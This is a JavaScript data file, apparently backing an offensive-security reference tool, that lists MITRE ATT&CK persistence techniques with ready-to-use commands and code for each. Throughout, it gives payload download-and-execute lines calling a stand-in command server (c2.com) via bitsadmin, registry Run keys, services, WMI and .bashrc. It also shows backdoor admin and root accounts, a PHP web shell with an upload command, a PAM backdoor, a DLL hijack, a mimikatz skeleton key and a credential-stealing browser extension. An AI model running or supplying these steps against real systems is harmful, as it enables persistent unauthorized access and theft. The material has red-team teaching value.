export const persistenceTechniques = [
  {
    id: "T1098",
    name: "Account Manipulation",
    summary: "add admin • SSH keys • OAuth tokens",
    description: "Manipulating accounts to maintain access including adding admin privileges, SSH authorized keys, or OAuth tokens.",
    tags: ["T1098", "account manipulation", "SSH keys", "admin privileges"],
    steps: [
      { type: "comment", content: "# T1098.001 - Add admin privileges to compromised account" },
      { type: "cmd", content: "net localgroup administrators attacker_user /add\nAdd-LocalGroupMember -Group 'Administrators' -Member 'attacker_user'" },
      { type: "comment", content: "# T1098.004 - Add SSH authorized key for persistent access" },
      { type: "cmd", content: "echo 'ssh-rsa AAAA...attacker_pub_key... attacker@host' >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys" },
      { type: "comment", content: "# T1098.003 - Add OAuth application for persistent API access" },
      { type: "cmd", content: "az ad app create --display-name 'LegitApp' --native-app\naz ad sp create-for-rbac --role Contributor" },
    ]
  },
  {
    id: "T1197",
    name: "BITS Jobs",
    summary: "bitsadmin • BITS persistence",
    description: "Abusing Windows Background Intelligent Transfer Service (BITS) to execute malicious code or maintain persistence.",
    tags: ["T1197", "BITS", "bitsadmin", "Windows"],
    steps: [
      { type: "comment", content: "# Create BITS job that downloads and executes payload" },
      { type: "cmd", content: "bitsadmin /create malware\nbitsadmin /addfile malware http://c2.com/payload.exe C:\\Users\\Public\\payload.exe\nbitsadmin /SetNotifyCmdLine malware C:\\Users\\Public\\payload.exe NUL\nbitsadmin /SetMinRetryDelay malware 60\nbitsadmin /resume malware" },
      { type: "comment", content: "# PowerShell BITS transfer" },
      { type: "code", content: "Start-BitsTransfer -Source 'http://c2.com/payload.exe' -Destination 'C:\\Windows\\Temp\\svchost.exe' -Asynchronous\nStart-Process 'C:\\Windows\\Temp\\svchost.exe'" },
    ]
  },
  {
    id: "T1547",
    name: "Boot/Logon Autostart Execution",
    summary: "registry run keys • startup folder • LSASS driver",
    description: "Configuring programs to run automatically at system boot or user logon via registry keys, startup folders, or other autostart mechanisms.",
    tags: ["T1547", "registry", "autostart", "startup folder", "run keys"],
    steps: [
      { type: "comment", content: "# T1547.001 - Add to registry Run key for persistence" },
      { type: "cmd", content: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"WindowsUpdate\" /t REG_SZ /d \"powershell -nop -w hidden -c IEX(IWR http://c2.com/p.ps1)\"" },
      { type: "comment", content: "# T1547.001 - PowerShell registry run key" },
      { type: "code", content: "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' `\n    -Name 'SystemUpdate' `\n    -Value 'powershell -nop -w hidden -ep bypass -c IEX(IWR http://c2.com/p.ps1)'" },
      { type: "comment", content: "# T1547.001 - Drop payload in startup folder" },
      { type: "cmd", content: "copy payload.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"" },
    ]
  },
  {
    id: "T1037",
    name: "Boot/Logon Initialization Scripts",
    summary: "logon scripts • bash_profile • /etc/init.d",
    description: "Using initialization scripts that run at boot or logon to establish persistence on Windows and Linux/Mac systems.",
    tags: ["T1037", "logon scripts", "bash_profile", "init scripts"],
    steps: [
      { type: "comment", content: "# T1037.001 - Windows logon script via Group Policy" },
      { type: "cmd", content: "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v UserInitMprLogonScript /t REG_SZ /d \"\\\\attacker\\share\\logon.bat\"" },
      { type: "comment", content: "# T1037.004 - Linux .bashrc / .bash_profile persistence" },
      { type: "cmd", content: "echo 'curl http://c2.com/check.sh | bash &' >> ~/.bashrc\necho 'curl http://c2.com/check.sh | bash &' >> ~/.bash_profile" },
      { type: "comment", content: "# T1037.003 - macOS login item" },
      { type: "cmd", content: "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/Users/user/Library/payload\", hidden:true}'" },
    ]
  },
  {
    id: "T1176",
    name: "Browser Extensions",
    summary: "malicious extension • Chrome extension persistence",
    description: "Installing malicious browser extensions that can persist across browser sessions and steal credentials or facilitate attacks.",
    tags: ["T1176", "browser extension", "Chrome", "Firefox"],
    steps: [
      { type: "comment", content: "# Deploy malicious Chrome extension via enterprise policy" },
      { type: "cmd", content: "reg add \"HKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist\" /v 1 /t REG_SZ /d \"extension_id;https://extension-server.com/update.xml\"" },
      { type: "comment", content: "# Malicious extension manifest" },
      { type: "code", content: "// manifest.json\n{\n  \"manifest_version\": 3,\n  \"name\": \"PDF Viewer\",\n  \"permissions\": [\"tabs\", \"storage\", \"cookies\", \"<all_urls>\"],\n  \"background\": {\"service_worker\": \"background.js\"},\n  \"content_scripts\": [{\"matches\": [\"<all_urls>\"], \"js\": [\"stealer.js\"]}]\n}" },
    ]
  },
  {
    id: "T1136",
    name: "Create Account",
    summary: "net user • useradd • backdoor accounts",
    description: "Creating new user accounts on local systems or domain environments to maintain access.",
    tags: ["T1136", "net user", "useradd", "backdoor account"],
    steps: [
      { type: "comment", content: "# T1136.001 - Create local backdoor account" },
      { type: "cmd", content: "net user backdoor P@ssw0rd123! /add /comment:\"\" /fullname:\"System Service\"\nnet localgroup administrators backdoor /add" },
      { type: "comment", content: "# T1136.002 - Create domain account (requires DA)" },
      { type: "cmd", content: "net user svcaccount P@ssw0rd123! /add /domain\nnet group \"Domain Admins\" svcaccount /add /domain" },
      { type: "comment", content: "# Linux: create hidden user account" },
      { type: "cmd", content: "useradd -M -s /bin/bash -u 0 -o -g root backdoor\necho 'backdoor:P@ssw0rd123!' | chpasswd" },
    ]
  },
  {
    id: "T1543",
    name: "Create or Modify System Process",
    summary: "Windows service • launchd • systemd unit",
    description: "Creating or modifying system-level processes such as services and daemons to execute malicious code with elevated privileges.",
    tags: ["T1543", "Windows service", "launchd", "systemd"],
    steps: [
      { type: "comment", content: "# T1543.003 - Create malicious Windows service" },
      { type: "cmd", content: "sc create WinUpdateSvc binPath= \"cmd /c start /b powershell -nop -w hidden IEX(IWR http://c2.com/p.ps1)\" start= auto DisplayName= \"Windows Update Service\"\nsc start WinUpdateSvc" },
      { type: "comment", content: "# T1543.002 - macOS LaunchDaemon" },
      { type: "code", content: "<!-- /Library/LaunchDaemons/com.apple.update.plist -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>\n  <key>Label</key><string>com.apple.update</string>\n  <key>ProgramArguments</key>\n  <array><string>/usr/bin/curl</string><string>http://c2.com/mac.sh</string></array>\n  <key>RunAtLoad</key><true/>\n</dict></plist>" },
      { type: "cmd", content: "launchctl load /Library/LaunchDaemons/com.apple.update.plist" },
    ]
  },
  {
    id: "T1546",
    name: "Event Triggered Execution",
    summary: "WMI subscriptions • COM hijack • AppInit_DLLs",
    description: "Establishing persistence via mechanisms that trigger execution based on events such as file modification, process start, or user logon.",
    tags: ["T1546", "WMI subscription", "COM hijack", "AppInit_DLLs"],
    steps: [
      { type: "comment", content: "# T1546.003 - WMI event subscription for persistence" },
      { type: "code", content: "$filterArgs = @{EventNameSpace='root/cimv2'; Name='WindowsUpdate'; QueryLanguage='WQL';\n    Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}\n$filter = Set-WmiInstance -Namespace 'root/subscription' -Class __EventFilter -Arguments $filterArgs\n$consumerArgs = @{Name='Update'; CommandLineTemplate='powershell -nop -w hidden IEX(IWR http://c2.com/p.ps1)'}\n$consumer = Set-WmiInstance -Namespace 'root/subscription' -Class CommandLineEventConsumer -Arguments $consumerArgs\nSet-WmiInstance -Namespace 'root/subscription' -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}" },
      { type: "comment", content: "# T1546.015 - COM object hijacking" },
      { type: "cmd", content: "reg add \"HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32\" /ve /t REG_SZ /d \"C:\\Users\\Public\\malicious.dll\"" },
    ]
  },
  {
    id: "T1574",
    name: "Hijack Execution Flow",
    summary: "DLL hijacking • PATH manipulation • LD_PRELOAD",
    description: "Hijacking application execution flow by manipulating how programs load libraries or executables.",
    tags: ["T1574", "DLL hijacking", "PATH manipulation", "LD_PRELOAD"],
    steps: [
      { type: "comment", content: "# T1574.001 - DLL hijacking - identify missing DLLs" },
      { type: "cmd", content: "procmon.exe  # Filter: Result=NAME NOT FOUND, Path ends with .dll" },
      { type: "comment", content: "# Compile and place malicious DLL where application searches" },
      { type: "code", content: "// malicious.dll\n#include <windows.h>\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {\n    if (fdwReason == DLL_PROCESS_ATTACH) {\n        // Execute payload\n        WinExec(\"powershell -nop IEX(IWR http://c2.com/p.ps1)\", 0);\n    }\n    return TRUE;\n}" },
      { type: "comment", content: "# T1574.006 - LD_PRELOAD hijacking on Linux" },
      { type: "cmd", content: "echo '/tmp/malicious.so' > /etc/ld.so.preload\n# or: export LD_PRELOAD=/tmp/malicious.so" },
    ]
  },
  {
    id: "T1556",
    name: "Modify Authentication Process",
    summary: "skeleton key • LSASS patch • PAM backdoor",
    description: "Modifying authentication mechanisms to install backdoors, skeleton keys, or rogue credentials that allow unauthorized access.",
    tags: ["T1556", "skeleton key", "PAM backdoor", "authentication"],
    steps: [
      { type: "comment", content: "# T1556.001 - Skeleton key via Mimikatz (requires DC access)" },
      { type: "cmd", content: "mimikatz # privilege::debug\nmimikatz # misc::skeleton\n# All accounts now accept password: 'mimikatz' in addition to their real password" },
      { type: "comment", content: "# T1556.003 - Linux PAM backdoor" },
      { type: "code", content: "// pam_backdoor.c - accepts magic password\n#include <security/pam_modules.h>\nPAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {\n    const char *password;\n    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);\n    if (strcmp(password, \"MAGIC_PASS\") == 0) return PAM_SUCCESS;\n    return PAM_AUTH_ERR;\n}" },
    ]
  },
  {
    id: "T1505",
    name: "Server Software Component",
    summary: "web shells • IIS module • transport agent",
    description: "Installing malicious software components on servers such as web shells, IIS modules, or mail transport agents for persistent access.",
    tags: ["T1505", "web shell", "IIS module", "transport agent"],
    steps: [
      { type: "comment", content: "# T1505.003 - Deploy web shell after exploitation" },
      { type: "code", content: "<?php\n// Minimal PHP web shell\nif(isset($_REQUEST['c'])){\n    system(base64_decode($_REQUEST['c']));\n}\n?>" },
      { type: "cmd", content: "# Upload via file upload vulnerability or LFI\ncurl -F 'file=@shell.php' https://target.com/upload/\n# Access: https://target.com/uploads/shell.php?c=d2hvYW1p" },
      { type: "comment", content: "# T1505.002 - Malicious IIS module" },
      { type: "cmd", content: "appcmd install module /name:\"WindowsAuth\" /image:C:\\Windows\\Temp\\malicious.dll" },
    ]
  },
];